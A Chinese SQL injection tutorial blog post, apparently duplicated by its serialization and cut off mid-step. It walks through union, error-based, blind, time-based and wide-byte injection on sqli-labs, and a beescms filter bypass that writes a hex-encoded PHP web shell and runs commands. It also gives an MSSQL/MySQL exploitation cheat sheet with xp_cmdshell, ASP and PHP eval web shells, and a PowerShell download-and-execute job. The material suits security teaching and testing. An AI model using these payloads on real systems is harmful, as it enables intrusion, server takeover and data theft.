SQL注入实战渗透测试\n1、首先打开指定站点，这里是以beescms搭建的网站\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317033373-8f7c7d9b-b60a-451a-b28d-ba425f92f9b4.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=554&size=81788&status=done&style=none&width=277)    \n2、通过御剑扫描发现了后台路径/admin/login.php\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317036903-c1a03aaf-c415-48e7-a1c9-6b124a0aa140.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=291&originWidth=554&size=59025&status=done&style=none&width=277)\n3、访问后台\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317042060-67c5cd02-56e2-44e5-a90f-05749886fcdc.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=283&originWidth=554&size=60786&status=done&style=none&width=277)\n4、抓包并发送到重放数据包模块进行测试\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317045189-57e2568e-0bce-4732-a132-41fb7f0f1967.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=237&originWidth=554&size=59839&status=done&style=none&width=277)\n5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317049040-76788297-cf7a-498a-bf05-a94be7c5846d.png#align=left&display=inline&height=92&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=554&size=53711&status=done&style=none&width=277)\n6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317053351-e7c46278-96ce-446c-9113-49f608e9462e.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=64458&status=done&style=none&width=277)\n7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。\n过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317057459-1b75bd6c-f68f-471d-803f-4606333306ff.png#align=left&display=inline&height=43&margin=%5Bobject%2Object%5D&name=image.png&originHeight=85&originWidth=554&size=19441&status=done&style=none&width=277)\n8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317060800-0510c154-b4ff-4202-9b12-37db39d11e93.png#align=left&display=inline&height=29&margin=%5Bobject%2Object%5D&name=image.png&originHeight=58&originWidth=366&size=11625&status=done&style=none&width=183)\n9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317065197-0ab9f91c-73e7-4991-b518-2a049007d84d.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&name=image.png&originHeight=115&originWidth=554&size=27857&status=done&style=none&width=277)\n10、回到网站，通过order by 判断出当前数据库字段数为5\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317068401-fc66cb55-5dfb-41f7-9f55-726dab9ffd30.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=50976&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317071848-afb83dbf-a19a-40fb-9c66-af5cabf23c07.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=45734&status=done&style=none&width=277)\n11、经测试，联合查询终于成功了。绕过方法：\nun union ion -> union\nseselectlect -> select\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317076201-0c74fd9e-0530-4941-8e19-68fffcaade81.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=51714&status=done&style=none&width=277)\n12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317082978-87ccd5f5-eed6-42b8-bd8c-d313b5d51ff3.png#align=left&display=inline&height=117&margin=%5Bobject%2Object%5D&name=image.png&originHeight=234&originWidth=554&size=62436&status=done&style=none&width=277)\n13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：\nin into  -> into\nououtfiletfile -> outfile\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317086950-f53a248a-e529-424b-8033-3d275770dfae.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&name=image.png&originHeight=232&originWidth=554&size=65986&status=done&style=none&width=277)\n14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：\n0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317091049-51499331-b0a7-4eb4-9941-6a45055e0e2d.png#align=left&display=inline&height=152&margin=%5Bobject%2Object%5D&name=image.png&originHeight=304&originWidth=554&size=19492&status=done&style=none&width=277)\n15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317094983-f7fb5184-1a94-4cf1-8295-4c3423910346.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=247&originWidth=554&size=62722&status=done&style=none&width=277)\n16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317099323-d646af4a-b862-405d-823c-b2975028e63e.png#align=left&display=inline&height=127&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=554&size=56751&status=done&style=none&width=277)\n17、通过菜刀工具，连接一句话木马，获取网站webshell。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317103226-679c62de-5503-4996-9ea4-acbbad2e0683.png#align=left&display=inline&height=119&margin=%5Bobject%2Object%5D&name=image.png&originHeight=238&originWidth=554&size=18591&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317106445-a24046e6-17ce-443d-b37b-63bd3fc90125.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=554&size=41660&status=done&style=none&width=277)\n18、进行执行系统命令操作。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317113216-93f538c1-d58a-4bac-b262-a15d676aa57a.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=27211&status=done&style=none&width=277)\n\n## 其他类型的SQL注入\n### 1、搜索框注入\n```php\n?id=1' and '1%'='1\t\t//返回正确的搜索结果\n?id=1' and '1%'='2\t\t//没有返回结果\n```\n### 2、header头部注入\nClient-IP\nUser-Agent\nX-Forwarded-For\n\n\n## SQL注入利用\n### 1、MSSQL\n#### 0x01 --os-shell\n```php\nfor /r C: %i in (*020.jpg*) do @echo %i //寻找020.jpg，获取所在目录\n\ndir c:\\phpstudy\\WWW\\image\t\t\t\t\t\t\t\t//列出某目录下文件\n\necho ^<%@ Page Language=\"Jscript\"%^>^<%eval(Request.Item[\"1\"],\"unsafe\");%^> > c:\\phpstudy\\WWW\\image\\shell.asp\n```\n#### 0x02 命令执行\n1、xp_cmdshell\n```php\n#开启xp_cmdshell\n?id=1;use master;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;\n\n#执行\n?id=1;use master;exec master..xp_cmdshell \"whoami\";\n\n#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)\nexec sp_addextendedproc xp_cmdshell ,@dllname=\"D:\\\\xplog79.dll\"\n```\n2、sp_oacreate\n```sql\n#xp_cmdshell删除后可以使用sp_oacreate\n#开启sp_oacreate\nexec sp_configure 'show advanced options',1;\nreconfigure with override;\nexec sp_configure 'Ole Automation Procedures',1;\nreconfigure with override;\nexec sp_configure 'show advanced options',0;\n\n#执行[此方法无回显]\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami >d:\\\\temp\\\\1.txt'\n```\n3、通过沙盒执行命令\n4、注册表\n5、通过Agent Job执行命令\n```sql\n#执行cs powershell命令\nUSE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))\"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';\n```\n#### 0x03 文件操作\n1、判断文件是否存在\n```sql\n#返回0表示不存在，返回1表示存在\nexec xp_fileexist \"c:\\\\users\\\\public\\\\test.txt\"\n```\n2、列目录\n```sql\n#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。\nexec xp_subdirs \"C:\\Users\\Administrator\\\",2,1\n```\n3、写文件\n```sql\n#开启Web Assistant Procedures\nexec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;\nexec sp_makewebtask 'c:\\www\\testwr.asp','select''<%execute(request('ss'))%>''\n```\n4、创建目录\n```sql\nexec xp_create_subdir 'D:\\test'\n```\n#### 0x04 信息获取\n```sql\nexec xp_getnetname\t\t\t//计算机名\nexec xp_msver\t\t\t\t\t\t//系统信息\nexec xp_fixeddrives\t\t\t//驱动器信息\nselect default_domain() as mydomain;\t\t//获取域名\n```\n### 2、MYSQL\n在高版本的mysql中，一般默认配置了--secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。\n```sql\n#general_log_file\nset global general_log='on';\nset global general_log_file='D:/phpStudy/WWW/1.php';\nselect '<?php assert($_POST[1]);?>';\nset global general_log='off'; //切记关闭\n```\n```sql\n#show_query_log_file\nset global show_query_log='on';\nset global show_query_log_file='D:\\\\phpStudy\\\\WWW\\\\1.php';\nselect sleep(15),'<?php assert($_POST[1]);?>';\nset global show_query_log='off'; //切记关闭\n```\n\n","source":"_posts/sql注入之重新学习.md","raw":"---\ntitle: sql注入之重新学习\ntags: \n  - 报错注入\n  - SQL注入\n  - 显错注入\n  - 盲注\n  - 宽字节注入\nccategories: web安全\nkeywords: 'web安全,sql注入,显错注入,报错注入,盲注,宽字节注入'\ndescription: 基于mysql进行sql注入的全方位讲解\ncover: /images/sql.jpeg\ndate: 2020-09-02 10:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## SQL注入\n\n### 概念：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如[http://www.xxx.com/i.php?id=13](http://www.xxx.com/i.php?id=13)。\n此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。\n### SQL注入的条件\n1、用户可以控制输入的数据，可以控制传参的内容。\n2、用户传参的内容被拼接到了代码去执行。\n\n### 判断是否存在SQL注入的具体流程:\n1、首先获取url：[http://www.xxx.com/i.php?id=1](http://www.xxx.com/i.php?id=1)\n2、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id='1'\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316298798-8ccfa038-d152-4f35-8958-c49444bff928.png#align=left&display=inline&height=150&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=21745&status=done&style=none&width=554)\n3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Select*from test where id ='1''，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316314777-a894da71-648e-48ed-98ef-ef2920228efe.png#align=left&display=inline&height=134&margin=%5Bobject%2Object%5D&name=image.png&originHeight=134&originWidth=554&size=30262&status=done&style=none&width=554)\n4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316319310-1a11b5b5-ce77-435e-9c0a-d6a567c92a91.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=144&originWidth=554&size=25407&status=done&style=none&width=554)\n5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Select*from test where id ='1' and 1=2 #'\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316325147-77f76770-d9d7-4e52-b710-48d496b98797.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=118&originWidth=554&size=21180&status=done&style=none&width=554)\n这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。\n在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。\n\n### SQL注入分类\n#### 显错注入\n有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。\n1、首先可以看到，传参id=1会输出两个数据：login name和password。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316363011-cb8e279e-0790-4dc7-8026-1d7ba13c7503.png#align=left&display=inline&height=125&margin=%5Bobject%2Object%5D&name=image.png&originHeight=250&originWidth=554&size=55928&status=done&style=none&width=277)\n2、加个单引号，页面报错了\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316370623-fb91b6e8-b745-4a07-8f13-3cf7c72bf2b7.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=59302&status=done&style=none&width=277)\n3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316375217-57e81aec-a8a6-4bf8-b5c3-0d78bf2864eb.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=207&originWidth=554&size=27510&status=done&style=none&width=277)\n4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316379696-6ec0c84e-8418-4e32-9494-2aa3dfbfbb4a.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=551&size=29486&status=done&style=none&width=275.5)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316386641-3ec52df4-6f87-4a73-b058-4de7e7d52bd2.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=169&originWidth=556&size=20870&status=done&style=none&width=278)\n5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316391466-cb32eb81-d7d1-40c2-be47-2e100ec71492.png#align=left&display=inline&height=114&margin=%5Bobject%2Object%5D&name=image.png&originHeight=227&originWidth=554&size=25091&status=done&style=none&width=277)\n6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。\n```sql\n?id=-1' union select 1,flag,3 from flag %23\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316396841-2c7ec9f0-a27a-48b3-9ad8-9715de47e1d5.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=29017&status=done&style=none&width=277)\n#### 报错注入\n通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。\n1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316496319-6b800c29-3255-48ee-ae2a-ca92277fe4bd.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&name=image.png&originHeight=164&originWidth=554&size=28491&status=done&style=none&width=277)\n2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316499725-53ea45fc-d881-4eca-921b-b7d961e7afb2.png#align=left&display=inline&height=88&margin=%5Bobject%2Object%5D&name=image.png&originHeight=175&originWidth=554&size=30016&status=done&style=none&width=277)\n3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316504397-5e9319dd-d6dc-4647-a85e-26b188524505.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=26175&status=done&style=none&width=277)\n4、使用报错函数updataxml()查询当前数据库库名。payload如下：\n?id=1 and updatexml(1,concat(0x7e,(select database())),1)\n这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316508649-186ae432-4135-45af-8370-2e0fc3b94bf2.png#align=left&display=inline&height=93&margin=%5Bobject%2Object%5D&name=image.png&originHeight=185&originWidth=554&size=20405&status=done&style=none&width=277)\n5、获取flag表中的数据。\n[http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1](http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1) and updatexml(1,concat(0x7e,(select flag from flag)),1)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316512988-f6e5a40c-b74e-419d-be49-cd685253756a.png#align=left&display=inline&height=75&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=23007&status=done&style=none&width=277)\n6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。\n获取第一个字符开始的20个数据：\n?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316517210-28964bb5-8a4e-44d1-bc99-5a5bbad1eee9.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=23621&status=done&style=none&width=277)\n获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：\n?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316521329-2c232ccc-5430-4284-ab38-335b355f6316.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=21660&status=done&style=none&width=277)\n### 盲注\n对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。\n#### 布尔盲注\n布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：\n1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316537064-402e041f-a4e4-4fd1-9cb4-16013920503e.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=20549&status=done&style=none&width=277)\n2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316541341-930c7ffa-7210-4f74-8b39-8237df940d48.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=19624&status=done&style=none&width=277)\n3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316545416-9133ab8b-c70f-421d-b7ad-d1cb876f11e0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&name=image.png&originHeight=203&originWidth=554&size=19835&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316549309-b0d686cf-f662-490a-89b3-fdcfe1722712.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=208&originWidth=554&size=19652&status=done&style=none&width=277)\n4、通过length()函数判断数据库库名的长度大于1。\n?id=1' and length(database())>1 %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316553774-792e2acb-2d05-4197-9c29-bb4345492ad1.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=193&originWidth=554&size=19558&status=done&style=none&width=277)\n5、在大于8的时候页面返回空，所以数据库库名长度等于8。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316557258-2afe4840-2c0c-4193-9f1d-f3065f5cc6c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=16991&status=done&style=none&width=277)\n6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码\n?id=1' and ascii(substr((select database()),1,1))>97 %23\n?id=1' and ascii(substr((select database()),1,1))=101 %23\n首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316561360-9e4bca64-de7b-4610-8b86-14ae35a9298d.png#align=left&display=inline&height=99&margin=%5Bobject%2Object%5D&name=image.png&originHeight=197&originWidth=554&size=20301&status=done&style=none&width=277)\n7、更改截取的位置，判断后面的字符对应的ascii码值。\n?id=1' and ascii(substr((select database()),2,1))=101 %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316565188-122d2ff2-501a-43e1-b1fb-bef02524ff60.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=554&size=19995&status=done&style=none&width=277)\n#### 延时盲注\n延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。\n1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316574305-a750e1da-86b1-452c-ad5e-dc2d2916fb80.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=19760&status=done&style=none&width=554)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316578704-29275196-b0bf-4a49-896e-acfa907a811f.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=205&originWidth=554&size=20224&status=done&style=none&width=554)\n2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316631400-e6e26c83-57e3-4745-8bdf-b41f34d87222.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=68367&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316634717-9fb75a2d-6415-4b77-a5e1-551fef19d90a.png#align=left&display=inline&height=77&margin=%5Bobject%2Object%5D&name=image.png&originHeight=154&originWidth=554&size=62202&status=done&style=none&width=277)\n3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。\n?id=2' and if((length(database())=8),sleep(5),1) %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316640888-0a021ca3-416e-49b5-a2ae-b58b989f0403.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=222&originWidth=554&size=81658&status=done&style=none&width=277)\n4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。\n?id=2' and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316644693-f9bed0ca-cd60-486b-85e5-24dc016a547e.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=79429&status=done&style=none&width=277)\n5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316649328-e68000df-34d7-4dfb-b2fe-88d147b1ae3f.png#align=left&display=inline&height=382&margin=%5Bobject%2Object%5D&name=image.png&originHeight=382&originWidth=533&size=28250&status=done&style=none&width=533)\n### 宽字节注入\n为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 '（单引号），\"（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入'（单引号）或者\"（双引号）进行闭合的时候，程序会自动在前面加上\\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。\n在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。\n\n\n#### 宽字节注入具体解析过程:\n1、在id传参后面加上%df和单引号\n2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\\’，即?id=1%df\\’ and 1=1 %23\nurl编码为：?id=1%df%5C%27%20and%201%3D1%20%23\n3、PHP将处理好的数据带入mysql处理时使用了gbk编码\n4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\\（反斜线）\n5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合\n\n\n#### 实例演示：\n1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316688943-fc742097-f3f9-40f1-b326-a4dd94d9691f.png#align=left&display=inline&height=217&margin=%5Bobject%2Object%5D&name=image.png&originHeight=435&originWidth=554&size=138295&status=done&style=none&width=277)\n2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316696285-c4740da5-d4f3-4e5e-b82e-a102fbba775d.png#align=left&display=inline&height=232&margin=%5Bobject%2Object%5D&name=image.png&originHeight=463&originWidth=554&size=157491&status=done&style=none&width=277)\n3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316701085-c5629ba1-eecd-4178-b782-2c8d1e94f979.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=554&size=111411&status=done&style=none&width=277)\n4、通过union select 